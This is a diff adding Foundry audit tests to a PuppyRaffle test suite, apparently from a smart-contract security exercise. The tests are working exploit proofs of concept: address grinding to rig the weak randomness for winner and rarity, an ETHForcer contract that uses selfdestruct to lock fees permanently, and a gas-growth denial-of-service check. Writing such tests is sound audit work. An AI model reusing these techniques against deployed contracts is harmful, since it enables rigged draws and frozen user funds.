@@ -371,6 +371,143 @@ contract PuppyRaffleTest is Test {
         assertEq(puppyRaffle.previousWinner(), playerFour);
     }
 
+    // THIS TEST WAS WRITTEN BY DEEPSEEK HARNESS SO I CAN UNDERSTAND DEEPLY MYSELF
+    function test_WeakRandomnessRarity_AUDIT() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        // the raffle has to be over before the draw, so this is the timestamp
+        // the attacker will be executing at
+        uint256 drawTime = block.timestamp + duration + 1;
+        vm.warp(drawTime);
+        vm.roll(block.number + 1);
+
+        // the attacker does not even have to be a player, they only have to be
+        // the caller, because msg.sender sits inside both hashes
+        address attacker;
+        uint256 winningIndex;
+        uint256 chosenRarity;
+
+        // grind over caller addresses until one of them picks playerFour as the
+        // winner AND hands them a legendary puppy
+        for (uint256 i = 0; i < 5000; i++) {
+            address candidate = address(uint160(1000 + i));
+
+            // these are the same two expressions used inside selectWinner()
+            uint256 index = uint256(
+                keccak256(
+                    abi.encodePacked(candidate, drawTime, block.difficulty)
+                )
+            ) % players.length;
+            uint256 rarity = uint256(
+                keccak256(abi.encodePacked(candidate, block.difficulty))
+            ) % 100;
+
+            // index 3 is playerFour, rarity 96-99 is LEGENDARY_RARITY
+            if (index == 3 && rarity > 95) {
+                attacker = candidate;
+                winningIndex = index;
+                chosenRarity = rarity;
+                break;
+            }
+        }
+
+        assertTrue(
+            attacker != address(0),
+            "attacker found a caller for winner + legendary"
+        );
+
+        vm.prank(attacker);
+        puppyRaffle.selectWinner();
+
+        console2.log("caller address picked by attacker:", attacker);
+        console2.log("winning index:", winningIndex);
+        console2.log("rarity rolled by attacker:", chosenRarity);
+        console2.log(
+            "rarity stored on the minted token:",
+            puppyRaffle.tokenIdToRarity(0)
+        );
+
+        assertEq(puppyRaffle.previousWinner(), playerFour);
+        assertEq(puppyRaffle.tokenIdToRarity(0), 5);
+    }
+
+    function test_MishandlingOfETH_AUDIT() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        // after a normal draw the contract holds exactly the recorded fees, which is the only state where withdrawFees is allowed to run
+        console2.log("totalFees recorded:", uint256(puppyRaffle.totalFees()));
+        console2.log("raffle balance:", address(puppyRaffle).balance);
+        assertEq(
+            address(puppyRaffle).balance,
+            uint256(puppyRaffle.totalFees())
+        );
+
+        // the contract has no receive or fallback, so the only way ETH gets in is by force feeding it with selfdestruct
+        ETHForcer forcer = new ETHForcer{value: 1 ether}();
+        forcer.attack(payable(address(puppyRaffle)));
+
+        console2.log(
+            "raffle balance after force feed:",
+            address(puppyRaffle).balance
+        );
+
+        // the equality can never hold again, so the fees are stuck forever
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+
+        assertGt(
+            address(puppyRaffle).balance,
+            uint256(puppyRaffle.totalFees())
+        );
+        console2.log("feeAddress balance:", address(feeAddress).balance);
+        assertEq(address(feeAddress).balance, 0);
+    }
+
+    function test_LoopBasedMembershipCheck_AUDIT() public {
+        address[] memory tenPlayers = new address[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            tenPlayers[i] = address(uint160(1000 + i));
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * 10}(tenPlayers);
+
+        uint256 gasBefore = gasleft();
+        puppyRaffle.getActivePlayerIndex(tenPlayers[9]);
+        uint256 gasWithTenPlayers = gasBefore - gasleft();
+
+        address[] memory morePlayers = new address[](90);
+        for (uint256 i = 0; i < 90; i++) {
+            morePlayers[i] = address(uint160(2000 + i));
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * 90}(morePlayers);
+
+        gasBefore = gasleft();
+        puppyRaffle.getActivePlayerIndex(morePlayers[89]);
+        uint256 gasWithHundredPlayers = gasBefore - gasleft();
+
+        console2.log("gas with 10 players:", gasWithTenPlayers);
+        console2.log("gas with 100 players:", gasWithHundredPlayers);
+        console2.log(
+            "Gas Difference:::::",
+            gasWithHundredPlayers - gasWithTenPlayers
+        );
+
+        assert(gasWithHundredPlayers > gasWithTenPlayers);
+    }
+
     function test_ArithmeticOverflow_AUDIT() public {
         // a separate raffle with a big entrance fee, so totalFees gets close to uint64 max
         uint256 bigEntranceFee = 1.5e19;
@@ -413,7 +550,7 @@ contract PuppyRaffleTest is Test {
         console2.log("expected without overflow:", expectedWithoutOverflow);
 
         assertTrue(expectedWithoutOverflow > type(uint64).max);
-        assertEq(bigRaffle.totalFees(), expectedWithoutOverflow - 2**64);
+        assertEq(bigRaffle.totalFees(), expectedWithoutOverflow - 2 ** 64);
     }
 
     function test_UnsafeCasting_AUDIT() public {
@@ -471,5 +608,15 @@ contract ReentrancyAttacker {
     }
     receive() external payable {
         _stealMoney();
+    }
+}
+
+contract ETHForcer {
+    constructor() payable {}
+
+    // selfdestruct pushes the whole balance into the target, and the target
+    // cannot refuse it, even without a receive or fallback function
+    function attack(address payable target) external {
+        selfdestruct(target);
     }
 }
